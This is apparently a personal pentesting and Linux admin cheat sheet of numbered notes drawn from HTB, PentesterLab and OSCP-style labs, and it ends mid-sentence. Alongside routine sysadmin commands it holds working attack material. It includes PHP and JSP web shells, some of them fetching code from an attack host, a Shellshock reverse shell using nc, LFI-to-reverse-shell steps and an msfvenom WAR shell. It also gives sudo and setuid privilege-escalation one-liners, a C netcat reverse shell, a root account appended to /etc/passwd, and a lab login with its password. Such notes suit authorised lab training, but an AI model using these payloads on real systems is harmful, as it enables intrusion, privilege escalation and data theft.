vt: Scans vulnerable themes only.
at: Scans all themes.


wpscan --url [url] --enumerate [p/vp/ap/t/vt/at]




The following command will test a target for all popular plugins:
wpscan --url [url] --enumerate p            // scan for vulnerable plugins only

wpscan --url [url] --enumerate ap           // scan for all plugins


References
https://github.com/wpscanteam/wpscan
https://wpscan.org/
https://wpvulndb.com/








=======================
143
setuid bit
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
wpscan --url [url] --enumerate vp           // scan for vulnerable plugins only




==========================
144
generate a sequence of numbers


seq 100 104


============================
145
chown command
change ownership of a file


chown user:group object




============================
146
convert hex into binary linux


xxd -r -p input.txt output.bin




=============================
extract the hexdump of an input. in this example we are looking at the first 512 bytes on one of the disks
sudo xxd -l 512 /dev/sda




=============================
147
hexdump [input file]     //display hex dump of the file




convert text into hex
cat text-file | hexdump






==============================
148
binwalk tool
used to find hidden info in files such as images




binwalk xyz


can be used to extract files too




binwalk -Me xyz.jpg




==============================
149
Bash check if a file doesn't exist


if [ ! -f /usr/sbin/popularity-contest ]; then
        exit 0
fi




===============================
150
xclip command
copy to your clipboard


cat filex | xclip


works with vi clipboard










==============================
151


Configure Ubuntu with a static address
/etc/network/interfaces
auto eth0
iface eth0 inet static
    address 10.0.0.41
    netmask 255.255.255.0
    network 10.0.0.0
    broadcast 10.0.0.255
    gateway 10.0.0.1
    dns-nameservers 10.0.0.1 8.8.8.8
    dns-domain acme.com
    dns-search acme.com

===================================
Configure centos with a static address
 nano /etc/sysconfig/network-scripts/ifcfg-eth0

edit the file adding the ip address manually
IPADDR=10.0.0.1
NETMASK=255.0.0.0
GATEWAY=10.0.0.2
 restart the service


 [root@hostname~]# service network restart





==================================


152


Linux privilege escalation scripts


LinEnum.sh  linux-enum-mod.sh  linuxprivchecker.py unixprivesc.sh




====================================
153
smtp telnet connectg and login via smtp


--EHLO <your mail server domain>
--Type AUTH LOGIN. The server responds with an encrypted prompt for your user name.
--Enter your user name encrypted in base 64. You can use one of several tools that are available to encode your user name.


-- The server responds with an encrypted base 64 prompt for your password. Enter your password encrypted in base 64.


-- Type MAIL FROM:<sender@domain.com>, and then press ENTER. If the sender is not permitted to send mail, the SMTP server returns an error.


-- Type RCPT TO:<recipient@remotedomain.com>,and then press ENTER.If the recipient is not a valid recipient or the server does not accept mail for this domain, the SMTP server returns an error


-- Type DATA.


-- If desired, type message text, press ENTER, type a period (.), and then press ENTER again.






If mail is working properly, you should see a response similar to the following indicating that mail is queued for delivery:


250 2.6.0 <INET-IMC-01UWr81nn9000fbad8@mail1.contoso.com.




example
Open your command prompt.
Now, connect with telnet using the following command:
telnet example.com 25
Type ehlo example.com. Some servers also accept helo in place of ehlo.
ehlo example.com
Type mail from: username@example.com:
mail from: username@example.com
Type rcpt to: friend@hotmail.com, friend2@yahoo.com (replace with your actual recipient name):
rcpt to: friend@hotmail.com, friend2@yahoo.com
To write the message - type data, followed by your subject and message. To end the message, put a period on a line by itself and press enter:
data
Subject: My Telnet Test Email


Hello,


This is an email sent by using the telnet command.


Your friend,
Me


.




=====================
154
pop3 login via pop3 to an email server




HOW TO CHECK OR READ EMAIL WITH TELNET


Open your command prompt.
At the command prompt, type in
telnet example.com 110
Type user and the email address (username@example.com) of the user for which you wish to view emails:
user username@example.com
Then type in pass followed by your password:
pass yourpasswordgoeshere
Type list to bring up a list of your emails:
list
You will see a list of items with labels like "1 897" and "2 5136." Here is an example:
list
+OK POP3 clients that break here, they violate STD53.
1 897
2 5136
3 1884
4 2973
5 2595
6 3063
7 3509
8 2283
9 1926
10 2763
11 1795
12 2780
13 2342
14 2342
15 2342
16 3833
17 2211
18 793
19 797
20 2599
.
If you wish to read an email message such as 2 5136, you can type the following:
retr 2
If you want to delete a message such as 1 897, type dele 1:
dele 1
When you are done checking your email, type quit.


===============================


155
Telnet IMAP login


1. telnet brainfuck.htb 143
2. a1 LOGIN orestis kHGuERB29DNiNE
3. a2 LIST "" "*"
4. a3 EXAMINE INBOX
5. a4 FETCH 1 BODY[]
6. a5 FETCH 2 BODY[]






==============================
156


convert text files from microsoft format into unix


dos2unix filename


===============================
157
php scripts file upload and command exec




<?php
if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.10:8000/" . $_REQUEST['fupload']));
};
if (isset($_REQUEST['fexec'])) {
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
};
?>
EOD;


===================================
158
tomcat admin password
in most cases, the file containing this information can be in two places:


the directory where tomcat is installed
a directory starting with tomcat in /etc/
The file is named tomcat-users.xml.








=================================
159 postgres sql database
The default authentication mode for PostgreSQL is set to ident.


cat /var/lib/pgsql/9.3/data/pg_hba.conf




# IPv4 local connections:
host    all              all             127.0.0.1/32             ident
# IPv6 local connections:
host    all              all             ::1/128                  ident


What is the ident authentication method? Well, it works by taking the OS username you’re operating as, and comparing it with the allowed database username(s). There is optional username mapping.


This means that in order to connect to PostgreSQL you must be logged in as the correct OS user. In this case, I am logged into the server as root. When I try to connect to PostgreSQL:


if you are logged in as an allowed user to the system then you just need to type psql and it will take you to postgres interpreter


\list to list the databases
\c [DATABASE] to select the database [DATABASE]
\d to list the tables


also
psql -U [username] -W [passowrd]


ref
https://www.liquidweb.com/kb/what-is-the-default-password-for-postgresql/




**** reading files from the file system


# CREATE TABLE demo(t text);
# COPY demo from '[FILENAME]';
# SELECT * FROM demo;




Where [FILENAME] is the filename.


-====================================
159
sqlite3


open a database file
 sqlite3 database.db

 .tables to get a list of tables.
SELECT .... to extract the content of a table using SQL.


=====================================


160 priv escalation with find command
pentesterlab@c4fcbc8fb291:~$ sudo -u victim  /usr/bin/find   /home/victim/key.txt   2>/dev/null -exec /bin/bash     \;




=======================================
161
abuse sudo with vim to get a shell
start vim with sudo and then
:!/bin/bash


==========================================
162
abuse sudo with less to get a shell
from within less do
!/bin/bash


==========================================
163


abuse sudo with awk to get a shell


print any file
awk '{print $1}' /home/victim/key.txt




start a shell
awk 'BEGIN {system("/bin/bash")}'


===========================================


164
setgid bit


ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 54192 Nov 18 2015 /usr/bin/passwd


In this example, the program /usr/bin/passwd is setuid root as it will run as the user root even if it's started by another user. You can see the setuid bit in the output of ls -l with the s in the permissions (instead of x for non-setuid program). Setuid root are always a good target as they often allow privileges escalation.


A few years ago, you could exploit this configuration issue by copying a shell (bash a long time ago and ksh more recently) and adding the setuid bit to it. [Un]fortunately most shells will now prevent this attack. But we can still do something similar by writing our own program.


pentesterlab@fb34ccb8e769:/tmp$ sudo -l
Matching Defaults entries for pentesterlab on fb34ccb8e769:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User pentesterlab may run the following commands on fb34ccb8e769:
    (victim) /bin/chmod, /bin/cp






To create this program, you can use the following C code:


int main(void)
{
system("cat /home/victim/key.txt");
}


You can then compile it:




gcc -o /tmp/[FILE] [FILE].c


Where [FILE] is the filename.


Then you will need to copy it using the sudo, this will allow you to create a file owned by the victim user. Once you copied it, you should be able to set the setuid and setgid flags on it using:




chmod +xs [FILE]


Where [FILE] is the filename.


Now you can run this program as the pentesterlab and you should be able to get access to the key.txt file thanks to the setgid
pentesterlab@fb34ccb8e769:/tmp$ sudo -u victim /bin/cp test.o victim.o
pentesterlab@fb34ccb8e769:/tmp$ ls -l
total 48
drwxr-xr-x 3 root         root         4096 Jun 17  2015 npm-15-Z7kY83XR
drwxr-xr-x 3 root         root         4096 Apr  6 05:40 npm-7-2596b8a1
-rw-r--r-- 1 pentesterlab pentesterlab   52 Jun 11 01:14 setgit30
-rwsr-sr-x 1 victim       victim         52 Jun 11 01:17 setvictimgid30
-rwsr-sr-x 1 victim       victim         52 Jun 11 01:19 setvictimgid30.c
-rwxr-xr-x 1 pentesterlab pentesterlab 6728 Jun 11 01:20 test
-rw-r--r-- 1 pentesterlab pentesterlab   58 Jun 11 01:16 test.c
-rwxr-xr-x 1 pentesterlab pentesterlab 6712 Jun 11 01:16 test.o
-rwxr-xr-x 1 victim       victim       6712 Jun 11 01:21 victim.o


pentesterlab@fb34ccb8e769:/tmp$ sudo -u victim /bin/chmod x+s victim.o
/bin/chmod: invalid mode: 'x+s'
Try '/bin/chmod --help' for more information.
pentesterlab@fb34ccb8e769:/tmp$ sudo -u victim /bin/chmod +xs victim.o
pentesterlab@fb34ccb8e769:/tmp$
pentesterlab@fb34ccb8e769:/tmp$
pentesterlab@fb34ccb8e769:/tmp$ ./victim.o
1340b7d2-76ce-49c0-9343-11cdf223b572
pentesterlab@fb34ccb8e769:/tmp$




this can also be used to create  a shell
int main(void)
{
system("/bin/bash");
}








==================
162
abusing sudo with perl


start a shell
pentesterlab@fc0305cf2170:~$ sudo -u victim /usr/bin/perl -e 'exec("/bin/sh -i")'


execute any command.
pentesterlab@fc0305cf2170:~$ sudo -u victim /usr/bin/perl -e 'exec("cat /home/victim/key.txt")'


==================
163
abusing sudo with python
pentesterlab@5c2cae808bb5:~$ sudo -u victim /usr/bin/python -c 'import subprocess;p=subprocess.call(["/bin/sh","-i"])'




OR
from subprocess import call
call(['uname'])


====================
164


abusing sudo with ruby




, you can start one using the following command:


sudo -u root /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'


Once you have the REPL running, you should be able to run commands by using `[COMMAND]` (for example `uname` to run uname).


\
// notice the use of the backtick here
above the thal


pentesterlab@fa311c184b73:~$ sudo -u victim /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
irb(main):001:0> uname
NameError: undefined local variable or method `uname' for main:Object
        from (irb):1
        from -e:1:in `<main>'
irb(main):002:0> 'uname'
=> "uname"
irb(main):003:0> `uname`
=> "Linux\n"
irb(main):004:0> `id`
=> "uid=1001(victim) gid=1001(victim) groups=1001(victim)\n"
irb(main):005:0> `cat /home/victim/key.txt`
=> "e4c59ad6-4be7-4bb1-934d-4d087084bed0\n"
irb(main):006:0>


======================
164
exploiting sudo with node [node js]


sudo -u victim /usr/local/bin/node -e 'var exec = require("child_process").exec;
exec("uname", function (error, stdOut, stdErr) {
console.log(stdOut);
});'




======================
shellshock quick test
execute a command


reverse shell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80




execute a command
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80








=======================
165
bypass web shell upload filter


try .php3 .php5 extensions
try .php;.txt for IIS 6 vulnerabilites
try .php.test in case apache has no handler for test and it falls back to php
try with BUrp to put the first bytes as a copy from actual image [linux magic byteews]








=============================
166
tomcat jsp war shell
 WAR file (Web Application Resource or Web application ARchive) with a reverse
shell using msfvenom. A WAR file is basically a zipped file that contains a web application that can be
deployed on a servlet/jsp container.




create this file


<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>




We can now create a directory name webshell and put our file (index.jsp) inside it:


$ mkdir webshell
$ cp index.jsp webshell
Now we can build the war file using jar (provide with java):


$ cd webshell
$ jar -cvf ../webshell.war *
added manifest
adding: index.jsp(in = 579) (out= 351)(deflated 39%)
Our Webshell (webshell.war) is now packaged and we can upload it using the Tomcat Manager.


upload the shell after that .






// generate one with msfvenom


msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Attack box IP] LPORT=4444 -f war >
/root/Desktop/shell.war
====================
167


ssh ipv6


ssh -i sneaky.key test@fe80::1%ens34
ssh -6 -i id-rsa test@2001::1


======================
168


view ipv6 neighbors
ip  -6 neighbors




=======================


169


install mips downloader
root@kali:~/htb/Lazy# apt-get install snmp-mibs-downloader




vi /etc/snmp/snmp.conf


comment the line that starts with mibs






=========================
170
check protection on binaries


checksec [binary-name]




===========================
180


disable ipv6 on linux
malhyari@ubuntuServer:~$ sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1




=============================
181
ubuntu new style interface config


malhyari@ubuntuServer:~$ cat  /etc/netplan/01-netcfg.yaml
# This file describes the network interfaces available on your system
# For more information, see netplan(5).
network:
  version: 2
  renderer: networkd
  ethernets:
    ens32:
      dhcp4: no
      addresses: [10.48.60.181/24]
      gateway4: 10.48.60.1
      nameservers: 144.254.71.184


=================================
182
nikto web scanning tool


nikto -h http://10.10.10.21 -useproxy http://10.10.10.21:31268
nikhto -h https://1.1.1.1 -p 4443


nikto -h [target host] -p 80,88,443   ** multiple port testing
nikto -h [target host] -p 80-88         ** multiple port testing with a range


scan tunning /define what does nikto do


0 - File Upload 1 - Interesting File / Seen in logs 2 - Misconfiguration / Default File 3 - Information Disclosure 4 - Injection (XSS/Script/HTML) 5 - Remote File Retrieval – Inside Web Root 6 - Denial of Service 7 - Remote File Retrieval – Server Wide 8 - Command Execution / Remote Shell 9 - SQL Injection a - Authentication Bypass b - Software Identification c - Remote Source Inclusion x - Reverse Tuning Options (i.e., include all except specified)












=================================
183


Null byte
http://website/page=../../../etc/passwd%00






php LFI/lfi
php filter LFI to get the content of a php file avoiding it to be rendered
php://filter


interesting files for LFI


• /etc/passwd
• /etc/shadow
• /etc/issue
• /etc/group
• /etc/hostname


log files


• /var/log/apache/access.log
• /var/log/apache2/access.log
• /var/log/httpd/access_log
• /var/log/apache/error.log
• /var/log/apache2/error.log
• /var/log/httpd/error_log






CMS configuration files


The following files are configuration files for popular content management systems. They usually contain sensitive information such as credentials to access the database.
• WordPress: /var/www/html/wp-config.php
• Joomla: /var/www/configuration.php
• Dolphin CMS: /var/www/html/inc/header.inc.php
• Drupal: /var/www/html/sites/default/settings.php
• Mambo: /var/www/configuration.php
• PHPNuke: /var/www/config.php
• PHPbb: /var/www/config.php




Windows
The following interesting files can (sometimes) be found on Windows systems:
• C:/Windows/System32/drivers/etc/hosts
• C:/Windows/Panther/Unattend/Unattended.xml
• C:/Windows/Panther/Unattended.xml




XAMPP
The following files are configuration and log files used by XAMMP on Windows:
• C:/xampp/apache/conf/httpd.conf
• C:/xampp/security/webdav.htpasswd
• C:/xampp/apache/logs/access.log
• C:/xampp/apache/logs/error.log






LFI to Shell


2 methods


- The proc/self/environ method
http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ




download a reverse shellcode form
http://pentestmonkey.net/tools/web-shells/php-reverse-shell




Unpack the contents of the gz.tar file and rename the ‘php-reverse-shell.php’ file to revshell.txt. Then open the file with a text editor and change the IP and port values


change the permissions of the file
chmod 755 /var/www/html/revshell.txt


Serve the file on the plate of python
python -m SimpleHTTPServer


use the Tamper Data plugin again to modify the user-agent


After reloading the page that includes proc/self/environ a pop-up from Tamper Data will appear. Click the ‘Tamper’ button to continue


Then another Tamper Data pop-up appears. This is where we have to replace the contents of the User-Agent field with code that downloads the revshell.txt file and stores it as a PHP file on the target system. Replace the User-Agent with the following code:
<?system('wget http://[IP attack box]/revshell.txt -O shell.php');?>


We can now execute the reverse shell using the following URL:
http://10.11.1.250/dvwa/vulnerabilities/fi/shell.php


- Metasploit and Meterpreter


Metasploit php_include exploit
msfconsole
use exploit/unix/webapp/php_include




Now we need to set a few important options:
- PHPURI: The URI to request where the vulnerable parameter is specified as XXpathXX.
- PATH: The base directory to prepend to the URL.
- RHOST: Remote host
- HEADERS: Cookie containing the PHPSESSID and the security value.




set HEADERS "Cookie:security=low; PHPSESSID=f7c5f19dfdbfca8021190b6d242a94c9"
set PHPURI /?page=XXpathXX
set PATH /dvwa/vulnerabilities/fi/
set RHOST 10.11.1.250
set LHOST 172.16.1.4
set payload php/meterpreter/bind_tcp
run


================================
184
setuid c file


int main(void)
{
setuid(0);
setgid(0);
system("/bin/bash");


}






=================================
185


host command
// find dns servers responsible for a domain name
host -t ns domain.com
// find mail servers for a domain
host -t mx megacorpone.com


//zone transfer
host -l <domain name> <dns server address>


host -l thinc.local 10.11.1.221




=================================
186
check if an argument was giveb to the bash script


if [ -z "$1" ]; then
echo "[*] Simple Zone transfer script"
echo "[*] Usage : $0 <domain name> "
exit 0
fi




==================================
187
dns enumeration tools
dnsrecon
dnsenum
dnsrecon -d megacorpone.com -t axfr


====================================
188
python tcp socket


#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
print "Usage: vrfy.py <username>"
sys.exit(0)
# Create a Socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect=s.connect(('10.11.1.215',25))
# Receive the banner
banner=s.recv(1024)
print banner
# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result=s.recv(1024)
print result
# Close the socket
s.close()




====================================
189
snmp scan
onesixtyone -c community -i ip   << community and ip are files


=====================================
190
snmpwalk


Enumerating Windows Users
root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25




Enumerating windows running processes
root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2


Enumerating Open TCP ports
root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3


Enumerating installed softwares
root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2


=====================================
191
kali wordlist file
/usr/share/wordlists/rockyou.txt




==========================================
192 generate encrypt a linux pass to be used in /etc/passwd


root@kali:/opt/linux-pe-scripts# openssl passwd -1 -salt elbeast hackthebox
$1$elbeast$97Aakv1Z8JeMFntbN8.je/


echo elbeast:$1$elbeast$97Aakv1Z8JeMFntbN8.je/:0:0:root:/root:/bin/bash >> /etc/passwd




OR with perl
perl -e ‘print crypt("YourPasswd", "salt"),"\n"'
    example
            perl -e ‘print crypt("pom", "pom"),"\n"’

Now that we know the password hash we can add the following line to the passwd database:
pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
su pom






===========================================
193


kill processes with a matching name or regex
pkill -f '^something.*'    ** kills amy process that starts with the name something.


===========================================
redirection
>  output redirection to a file
2> error redirection to a file
2>&1 output and error redirection


===========================================
SEGMENTATION FAULT, BUS ERROR
A segmentation fault essentially means that the person who wrote the program that you just ran screwed up somewhere. The program tried to access a part of memory that it was not allowed to touch, and the operating system killed it. Similarly, a bus error means that the program tried to access some memory in a particular way that it shouldn’t. When you get one of these errors, you might be giving a program some input that it did not expect.




===========================================
194


tee command
show oputut on the terminal and at the same time redirect it to a file


fisrt command | tee output.txt








==========================================
195
Nsswitch.conf file
network infomraton file on linux


=======================================


196
resolv.conf


DNS configuraiton file


nameserver 1.1.1.1
search localdomain




=======================================
197
connect to mysql from kali


apt-get install sqsh freetds-bin freetds-common freetds-dev


define server parameters @/etc/freetds/freetds.conf
[MyServer]
host = 192.168.1.10
port = 1433
tds version = 8.0




Define username and passwords  @~/.sqshrc
\set username=sa
\set password=password
\set style=vert


Connect to the server
sqsh -S MyServer


mysql write file to server
select "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "C:\xampp\htdocs\test"






==========================================
198
p0f


passive scanner analyzing network traffic with the intent of identifying the active operating system


===========================================
199


Fierece
reconnaissnace tool written in Pertl to locate ip space and hostnames using dns


Fierece -dns hackingturorials.org


The first thing that Fierce does it locating the name servers for the given domain. Next it tries to perform a zone transfer on every name server, checks for a wildcard DNS record and finally brute forces subdomains using an internal wordlist. Once the scan is finished Fierce will show the found subdomains at the bottom of the output. By default, Fierce uses its own wordlist but you can also use your own wordlist by specifying it in the wordlist option as follows:
fierce -dns hackingtutorials.org –wordlist [path to wordlist]




==========================================
200
subkist3r


python tool
enumerate subdomains using data from publicly available resources.


uses popular search engines such as google, bing, and yaho to discover subdomains for a given domain.


sublist3r -d estartasolutions.com
=========================================
201
theharvester


email addresses search tool




theharvester -d hackingtutorials.org -b all


==========================================
202
netdiscover
netdiscover -r 10.11.1.0/24


scan for alive hosts using arp on the same subnet


=======================================
203


rpcclient
linux tool used for executing client side MS -RPC functions.
rpcclient -U “” [target IP address]         ** null session test




enumeration after a sucessful connection
querydominfo   // domain info
enumdomusers    // get a list of the users.
queryuser [username]        // query the user info
queryuser msfadmin          // query the userinfo for the msfadmin account


============================================
201
kali reporsotires


http://docs.kali.org/general-use/kali-linux-sources-list-repositories


/etc/apt/sources.list


enusre what is in this file matches what is in the link




==========================================
202
metasploit msfconsole




service postgresql start
msfconsole


search type:explopit bla
search type:aux bla


show payloads // show compatible paylods with an exploit


-- create the multi handler :


use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
// payload can be the meterpreter here.




https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
https://netsec.ws/?p=331
============================================
203
world writable directories


/tmp /dev/shm


===============================================
204
/etc/passwd






1. Username.
2. Password. The ‘x’ means that the actual password is stored in the shadow password file. You can replace the x with a crypt hash from the password and a salt.
3. User identifier.
4. Group identifier, contains the primary user group.
5. Gecos field, a user record containing information about the user such as the full name.
6. Path to the home directory.
7. Command line shell when the user logs in.


==============================================
205


RFI


for this to work following should be enabled ion php.ini file




allow_url_fopen = On
allow_url_include = On


usually php.ini is at phpinfo.php
or /etc/php5/cgi/php.ini


nano /etc/php/7.0/apache2/php.ini
nano /etc/php5/apache2/php.ini
===================================================
206
php popular extensions
php
php4
pht
phtml




=================================================
207


crunch
password generation tool


crunch [min length] [max length] [charset] [options]
crunch 4 4 ABCDEFGHIJKLMNOPQRSTUVWXYZ -o /root/Desktop/wordlist.txt
crunch 5 5 0123456789 -o /root/Desktop/numbers.txt


The next wordlist contains all possible combinations with 4 letters follow by 1980. The 1980
represents a year of birth for instance, commonly used as a password in combination with a name:
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ -t @@@@1980 -o /root/Desktop/wordlist.txt




// specifying the char set in the command
crunch 1 2 -p Virtual Hacking Labs




====================================================


208
scrap a site to generate a list of passwords from that site


cewl




-m is the minimum word length for words to save to the wordlist.
-d is the maximum depth the spider is allowed to scrape.
-o is offsite, used to allow the spider to leave the current website to another
website.
-w is write to output file, specify the output file here


cewl -d 1 -m 8 -w /root/Desktop/cewl.txt https://www.kali.org
====================================================
209
xxd [input file]        // display file content in hex




=================================================
210


important files and useful


/proc/self/status               Info about current process
/.ssh/id_rsa                    private key
/proc/self/environment      variables the process has








=================================================
211
filezila server password file
FileZilla Server.xml






++++++++++++++++++++++++++++++++++++++++++++++++++
212
connecting to an ldap server and run queries there
openldap
ldapsearch




****All entries on host ldap.renovations.com using port 389, and return all attributes and values
ldapsearch -h ldap.renovations.com "objectClass=*"




**** all entries and return attribute names only
ldapsearch -A -h ldap.renovations.com "objectClass=*"


**** all entries and return and return attributes=mail, cn, sn, givenname
ldapsearch -h ldap.renovations.com "objectClass=*" mail cn sn givenname


**** (cn=Mike*) under base "ou=West,o=Renovations, c=US" on host ldap.renovations.com using port 389, and return all attributes and values
ldapsearch -b "ou=West,o=Renovations,c=US" -h ldap.renovations.com "(cn=Mike*)"


*** connect with a username and password
ldapsearch -x -LLL -h ip -D 'cn=admin,dc=ivhdev,dc=local' -w password -b 'dc=users,dc=local' -s sub '(objectClass=*)' 'givenName=username*'


++++++++++++++++++++++++++++++++++++++++++++++++++
ss command
stands for socket statistics


the replacement of netstat command
** view listening sockets
ss -4 state listening


** the command with no options
returns a complete list of all tcp sockets with established connections




** view currently listening sockets
ss -l


** view established tcp connection only
ss -t
** view established udp connection only
ss -u


** what if i want to view listening sockets too. you just need to add the -a option
ss -t -a


** Filtering ss with TCP States
STATUS:
established
syn-sent
syn-recv
fin-wait-1
fin-wait-2
time-wait
closed
close-wait
last-ack
listening
closing


TCPv4
ss -4 state FILTER


example:
ss -4 state listening


TCPv6
ss -6 state FILTER


** Show connected sockets from specific address
ss dst 192.168.1.139




** view all listening ports and with no name resolution
ss -tuna




+++++++++++++++++++++++++++++++++++++
c code reverse shell c shell


#include <stdio.h>
#include <stdlib.h>


int main(void)
{
 system("nc -nv 127.0.0.1 53 -e /bin/bash");


}




+++++++++++++++++++++++++++++++++++++++++++
add a delay to packets  on an interface
# tc qdisc add dev eth0 root netem delay 100ms


++++++++++++++++++++++++++++++++++++++++++++
Create a soft symbolic link
simply names that point to other names
ln -s [target] [link-name]






Don’t forget the -s option when creating a symbolic link. Without it, ln creates a hard link, giving an additional real filename to a single file. The new filename has the status of the old one; it points (links) directly to the file data instead of to another filename as a symbolic link does. Hard links can be even more confusing than symbolic links.


++++++++++++++++++++++++++++++++++++++++++++
linux devices
everything is a file
kernel presents devices to users as files
but there is a limit to what they can do through files I/O operation
/dev/ directory contains device nodes.




device files
block
                disks
        radndom access
        block size



character
        write and read character devices
    works with data steams


pipe


 are like character devices, with another process at the other end of the I/O stream instead of a kernel driver.


socket


        used for interprocess communication
    found outside /dev/ directory
    these are unix domain sockets.


network devices do not have device nodes but kernel provides other i/o interfaces for them
so seems /dev/ is one of the i/o interfaces as i understand .


sysfs device path directory :
        provide a uniform view of attached devices based on their actual hardware attributes


the Linux kernel offers the sysfs interface through a system of files and directories. The base path for devices is /sys/devices. For example, the SATA hard disk at /dev/sda might have the following path in sysfs:




/sys/devices/pci0000:00/0000:00:1f.2/host0/target0:0:0/0:0:0:0/block/sda








The /dev file is there so that user processes can use the device, whereas the /sys/devices path is used to view information and manage the device.








There are a few shortcuts in the /sys directory. For example, /sys/block should contain all of the block devices available on a system. However, those are just symbolic links; run ls -l /sys/block to reveal the true sysfs paths.




find the location of a file inside the /sysfs directory
$ udevadm info --query=all --name=/dev/sda




find the name of a device
1- query udevd with udevadm
2- look for devices in the /sys directory
3- guess the name by looking at dmesg output
4- check mount command output
5- cat /proc/devices




list scsi devices on your system
lsscsi


letter was used to identify first connected devies with sda and 2nd one with sdb
this creates a problem if disks are swapped or damaged
linux uses UUID to solve that.


universally unique identifiers






CD and DVD drives:
/dev/sr*                        // only for read
/dev/sg0                         // both read and write




======================
Terminals :
/dev/tty
/dev/pts




terminals are devices to move characters between a user process and an I/O device. usually for text
output to a terminal screen.


Pseudoterminal devices are emulated terminals that understand the I/O features of real terminals. But rather than talk to a real piece of hardware, the kernel presents the I/O interface to a piece of software, such as the shell terminal window that you probably type most of your commands into.


common terminal devices are:
/dev/tty1  : the first virtual console
/dev/pts/0 : the first pseudoterminal device




if you consider the linux terminal that is started when you do ctrl alt #number
the system here delivers the I/O you write on the keyboard to that emulatd terminal ....




/dev/tty is the controlling terminal of the current process.  If a program is currently reading from and writing to a terminal, this device is a synonym for that terminal.


in text mode a getty server usually take control of the tty1 for example
while in gui mode x server takes control of one of the ttys


switch from text mode with ALT+ Func Key
switch from graphiscal mode ctrl alt func


if for some reason keys are not working you can force console siwtch via
# chvt 1




how device files used to be created in the past
mknod /dev/sda1 b 8 2


this now currently is only useful with named pipes






=============================
parted -l                         // view partition tables on disk





==============================
fsck -a
fsck -p


=============================
use a disk partition as swap
mkswap /dev/sda2
swapon /dev/sda2


put in /etc/fstab
/dev/sda5 none swap sw 0 0




=============================
what is actually in the file system
1- a pool of data blocks
2- a database system that manages the data pool.




an inode is a set of data that describes a particular file. including its type, permissions and where in the data pool the file resides .




Filenames and directories are also implemented as inodes. A directory inode contains a list of filenames and corresponding links to other inodes.








++++++++++++++++++++++++++++++++++++++++++++


yum
// The package manager for redhat


// install the package
yum install traceroute


// install from url
yum install https://x.x.x.x/traceroute.rpm


// update a package
yum update bash


// check for update
yum check-update                        // checks installed packages versus meta data available




// yum list [package name]


//yum into [package name]




// update all
yum update


// search for a package
yum search [search pattern]


check which pacckages is needed
yum provides */traceroute
yum provides top            // check for package providin top as a binary/file




// group lists            [a collection of packages that can be installe together]
yum groups list


pick what do you want to install and then install it:
yum groups install "Basic Web Server"
yum groups info "Basic Web Server"


// query a package version


yum -q bash




// view a list of all repos configured
yum reprolist




// yum clean all            //clean yum cache




// view a list of all repos configured with verbos info
yum reprolist
++++++++++++++++++++++++++++++++++++++++++++
linux reposotories
it is where you store packages
1-software publishers {redhat, centos}
2-thirdparty (EPEL, RPMForge}
3-your own reprositories




/etc/yum.conf
        where does yum keep cached packages
        where is it logging messages



/etc/yum.repos.d
        repositories config






create a yum reprository poitning to the disk:
create a file inside /etc/repo.d/local.repo


content of the file:
[local]
name = Local DVD Repository
baseurl=file:///var/repo/dvd
enabled=1








++++++++++++++++++++++++++++++++++++++++++
ip -s link


view statisitcs on the port   // similar to ifconfig






+++++++++++++++++++++++++++++++++++++++++++
very detailed output on the interface counters


 ethtool -S ens32



+++++++++++++++++++++++++++++++++++++++
montoring of ip traffic [real time]
iptraf-ng




same for ntop


malhyari@ubuntuServer:~$ apt-cache search -n ntop
diveintopython-zh - free Python book for experienced programmers (zh translation)
diveintopython3 - book for learning Python 3
ntopng - High-Speed Web-based Traffic Analysis and Flow Collection Tool
ntopng-data - High-Speed Web-based Traffic Analysis and Flow Collection Tool (data files)
radeontop - Utility to show Radeon GPU utilization
sntop - A curses-based utility that polls hosts to determine connectivity






runs as a service
port 3000 /     web interface that can be accessed from another machine /




+++++++++++++++++++++++++++++++++++++++
adding a new group to the system
groupadd web


+++++++++++++++++++++++++++++++++++++++




add users to groups
usermode -aG [group_name] [user_name]




change the group of a fiel
